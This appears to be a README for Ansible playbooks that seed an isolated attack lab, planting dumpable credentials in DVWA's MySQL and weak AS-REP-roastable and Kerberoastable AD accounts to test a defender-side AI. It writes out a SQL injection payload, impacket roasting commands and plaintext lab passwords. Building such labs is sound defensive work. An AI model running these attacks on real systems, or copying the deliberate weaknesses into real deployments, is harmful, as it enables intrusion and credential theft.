# Scenario Lab State Seeder

Ansible playbooks that plant the lab state used by the MITRE ATT&CK attack scenario.

## Prerequisites

Project must be bootstrapped. From the repo root:

```bash
cd ~/sentinel-ai-commander
./bootstrap.sh
source activate.sh
```

This creates `.venv/` and `.ansible-collections/` in the repo root, both gitignored, both fully reproducible. The activate script must be `source`d (not executed) to inherit the environment.

Verify ansible is reachable:
```bash
ansible --version
ansible-galaxy collection list | grep -E 'mysql|windows'
```

You should see `community.mysql` and `ansible.windows` listed.

## What gets planted

### On srv-sql (10.50.0.13) MySQL

A new table `dvwa.infra_credentials` containing:

- **5 real working credentials** for srv-dns-bind, srv-web, srv-sql, srv-ftp, srv-ad-dns. When a SQLi dumps this table from DVWA, the attacker gets working pivot credentials.
- **2 decoy credentials** (legacy-mail, srv-backup-01) that look real but DON'T work. These exist to test the defender-side AI's ability to triage which credentials matter when investigating a credential-dump alert.

The `dvwa` MySQL user is granted SELECT on this table so the SQLi chain works end-to-end via DVWA.

### On srv-ad-dns (10.50.0.10) Active Directory

Two deliberately weak service accounts:

1. **`svc-legacy`** — has `DoesNotRequirePreAuth=true` flag set. AS-REP roastable. Attack with:
   ```
   impacket-GetNPUsers mydomain.local/ -no-pass -usersfile users.txt
   ```

2. **`svc-mssql`** — has SPN `MSSQLSvc/srv-sql.mydomain.local:1433` registered. Kerberoastable. Attack with:
   ```
   impacket-GetUserSPNs mydomain.local/<authenticated_user>:<pass> -request
   ```

Both have moderately weak passwords (`Summer2024!` and `Welcome2024!`) that will succumb to hashcat with a standard wordlist.

### On localhost (WSL2)

A `lab_state.json` summary file written to `~/sentinel-ai-commander/lab_state.json`. The scenario orchestrator script reads this to know what's planted where.

## Pre-flight checks before running

```bash
cd ~/sentinel-ai-commander/ansible
ansible -i inventory/scenario_hosts.yml all -m ping
```

You should see green SUCCESS for all 5 hosts. The Windows hosts will use `win_ping` automatically because of the `ansible_connection: winrm` setting.

If any host fails:
- **Linux hosts** → check key in `keys/id_rsa` is authorized; verify `ssh louay@10.50.0.x` works directly
- **Windows hosts** → check `nc -zv 10.50.0.x 5985`; verify WinRM service running; check network category is Private not Public

## Run the seeder

```bash
ansible-playbook -i inventory/scenario_hosts.yml playbooks/seed_scenario_state.yml
```

You should see green tasks for:
- Pre-flight connectivity to all 5 hosts
- MySQL table creation + 7 rows inserted (5 real + 2 decoy)
- 2 AD accounts created/updated with the appropriate weakness flags
- lab_state.json written

If anything fails, re-run safely — every task is idempotent.

## Rollback

```bash
ansible-playbook -i inventory/scenario_hosts.yml playbooks/rollback_scenario_state.yml
```

Drops the MySQL table, removes the AD accounts, deletes lab_state.json.

## Verifying after seeding

### Check MySQL plant

```bash
ssh -i keys/id_rsa root@10.50.0.13
mysql -uroot -plouay -e "SELECT id, system_name, service, ip_address, username, last_rotated FROM dvwa.infra_credentials;"
```

Should show 7 rows.

### Check DVWA can dump it via SQLi

From Kali, log into DVWA at http://10.50.0.12/dvwa/login.php (default: admin/password), set security to Low, go to SQL Injection page, submit:

```
1' UNION SELECT username, password FROM infra_credentials-- -
```

Should return all 7 credential pairs.

### Check AD accounts

From WSL2:
```bash
ansible -i inventory/scenario_hosts.yml ad_hosts -m ansible.windows.win_shell \
    -a "Get-ADUser -Filter 'SamAccountName -like \"svc-*\"' -Properties Description,DoesNotRequirePreAuth,servicePrincipalName"
```

From Kali (impacket already installed):
```bash
# AS-REP roast (no creds needed)
impacket-GetNPUsers mydomain.local/ -no-pass -usersfile <(echo "svc-legacy")

# Kerberoast (needs valid creds first)
impacket-GetUserSPNs mydomain.local/svc-legacy:Summer2024! -request
```

## Troubleshooting

### `Authentication or permission failure` on srv-sql

The playbook assumes MySQL root password is `louay` (matching the linux root password). If your MySQL root is different, edit `mysql_root_password` in seed_scenario_state.yml under `Phase 1` vars.

### `Cannot load ActiveDirectory module` on srv-ad-dns

The AD module ships with RSAT, which is installed by default on Domain Controllers. If this fails, verify with:
```powershell
Get-WindowsFeature AD-Domain-Services
```

### Collections not found

If you see "couldn't resolve module/action 'community.mysql.mysql_query'", the ANSIBLE_COLLECTIONS_PATH isn't set. Either re-source activate.sh or run:
```bash
export ANSIBLE_COLLECTIONS_PATH=~/sentinel-ai-commander/.ansible-collections
```

### `ansible-playbook` not found

You haven't activated the venv. Run:
```bash
source ~/sentinel-ai-commander/activate.sh
```
